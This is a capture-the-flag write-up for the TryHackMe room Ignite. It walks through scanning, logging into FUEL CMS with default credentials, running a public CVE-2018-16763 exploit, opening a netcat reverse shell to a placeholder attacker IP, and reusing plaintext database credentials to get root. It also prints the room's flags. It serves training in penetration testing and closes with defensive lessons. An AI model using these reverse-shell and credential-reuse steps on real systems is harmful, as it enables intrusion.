# TryHackMe - Ignite Writeup

> **Platform:** TryHackMe
> **Challenge:** Ignite
> **Category:** Linux | Web Exploitation | Remote Code Execution | Privilege Escalation

---

# Overview

Today we are solving another easy-rated Linux challenge from TryHackMe named **Ignite**.

This room focuses on exploiting a vulnerable content management system to gain remote code execution, followed by local enumeration to escalate privileges and obtain root access.

---

# Target Information

**Target IP**

```text
10.48.158.248
```

---

# Initial Reconnaissance

The first step is performing a full TCP port scan.

```bash
nmap -p- 10.48.158.248
```

The scan reveals only one open port.

```text
80/tcp  HTTP
```

With only a web service exposed, the next step is to enumerate the application in detail.

---

# Service Enumeration

A service and version scan is performed.

```bash
nmap -sC -sV 10.48.158.248
```

The results reveal:

* Apache 2.4.18 (Ubuntu)
* robots.txt present
* FUEL CMS running

One interesting finding is the `robots.txt` entry.

```text
Disallowed: /fuel/
```

This suggests that the administration panel may be located under the `/fuel` directory.

---

# Web Enumeration

Browsing the homepage reveals an important piece of information.

The default landing page exposes the administrator portal along with default credentials.

```text
Username: admin

Password: admin
```

Navigating to:

```text
http://10.48.158.248/fuel
```

allows successful authentication into the FUEL CMS dashboard.

Finding default credentials exposed on a production system is already a significant security issue, but the next step is to determine whether the installed version contains any known vulnerabilities.

---

# Vulnerability Research

Searching for vulnerabilities affecting the installed version of FUEL CMS quickly reveals a known Remote Code Execution vulnerability.

Relevant references include:

* Exploit-DB 47138
* CVE-2018-16763
* Public Python proof-of-concept exploits

Since a public exploit is available, it can be used to verify whether the target is vulnerable.

---

# Remote Code Execution

Running the exploit against the target:

```bash
python3 exploit.py -u http://10.48.158.248/
```

The exploit successfully provides command execution.

Testing with a simple command:

```text
ls
```

returns the contents of the web root, confirming Remote Code Execution.

At this stage the application is fully compromised.

---

# Obtaining a Reverse Shell

Instead of executing individual commands through the exploit, a reverse shell is spawned using Netcat.

```bash
busybox nc <ATTACKER_IP> 4444 -e /bin/bash
```

A listener on the attack machine immediately receives the connection.

Checking the current user:

```bash
id
```

returns:

```text
uid=33(www-data)
```

indicating command execution as the web server user.

---

# Shell Stabilization

To make post-exploitation easier, the shell is upgraded using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After suspending the shell, terminal settings are adjusted.

```bash
stty raw -echo
fg
```

Finally:

```bash
export TERM=xterm-256color
```

provides a fully interactive shell.

---

# User Flag

With shell access established, the home directory is inspected.

Reading the user flag:

```text
6470e394cbf6dab6a91682cc8585059b
```

---

# Privilege Escalation Enumeration

Since `sudo -l` requires a password, automated enumeration is performed using **LinPEAS**.

The report highlights an outdated version of sudo.

```text
Sudo 1.8.16
```

While researching possible privilege escalation paths, another much more interesting finding appears.

The FUEL CMS database configuration file is world-readable.

```text
/var/www/html/fuel/application/config/database.php
```

Opening the file reveals the database credentials.

```php
hostname : localhost

username : root

password : mememe

database : fuel_schema
```

Finding credentials inside application configuration files is extremely common during real-world penetration tests.

---

# Privilege Escalation

The recovered credentials are reused for the root account.

After switching users successfully, full administrative access is obtained.

Reading the root flag:

```text
b9bbcb33e11b80be759c4e844862482d
```

The machine is now fully compromised.

---

# Attack Flow

```text
Nmap Scan
        │
        ▼
Discover HTTP Service
        │
        ▼
Identify FUEL CMS
        │
        ▼
Access Admin Panel
        │
        ▼
Login Using Default Credentials
        │
        ▼
Research Public Vulnerabilities
        │
        ▼
Exploit CVE-2018-16763
        │
        ▼
Gain Remote Code Execution
        │
        ▼
Spawn Reverse Shell
        │
        ▼
Stabilize Shell
        │
        ▼
Enumerate System
        │
        ▼
Recover Database Credentials
        │
        ▼
Reuse Root Password
        │
        ▼
Obtain Root Access
```

---

# Vulnerabilities Identified

* Default administrator credentials
* Outdated FUEL CMS
* CVE-2018-16763 Remote Code Execution
* Sensitive credentials stored in plaintext
* Weak credential reuse
* Improper file permissions on configuration files

---

# Key Takeaways

This room demonstrates how multiple small security issues can combine into a complete system compromise. The application exposed default administrator credentials, allowing access to the CMS dashboard, while an outdated version of FUEL CMS remained vulnerable to a publicly available Remote Code Execution exploit.

Once initial access was obtained, local enumeration became the most important phase of the engagement. Instead of relying solely on automated privilege escalation exploits, inspecting application configuration files revealed database credentials stored in plaintext. Reusing those credentials ultimately resulted in full root access.

Ignite serves as a strong reminder that keeping software updated, removing default credentials, protecting configuration files, and avoiding password reuse are essential defensive practices for securing production environments.
